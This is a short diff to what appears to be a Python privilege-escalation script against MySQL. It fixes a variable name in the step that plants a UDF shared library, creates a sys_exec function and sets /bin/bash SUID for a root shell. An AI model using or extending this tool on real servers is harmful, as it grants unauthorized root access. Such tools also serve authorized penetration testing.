@@ -79,7 +79,7 @@ def crate_sharedLib(plugin_dir):
         sys.exit
     else:
         print(f'[#] UDF library crated successfully: {udf_outfile}')
-        return udf_outfile
+        return udf_filename
 
 def crate_function(udf_filename):
     print("[#] Trying to create sys_exec")
@@ -120,10 +120,10 @@ def cmd_mysql(db_user, db_password):
     print(f'Plugin Path: {plugin_dir}')
     
     # Crate Shared Libery file .so and Check
-    udf_outfile = crate_sharedLib(plugin_dir)
+    udf_filename = crate_sharedLib(plugin_dir)
 
     # Crate Function and Check 
-    crate_function(udf_outfile)
+    crate_function(udf_filename)
 
     # Use the Function to crate a /bin/bash SUID
     crate_SUID()
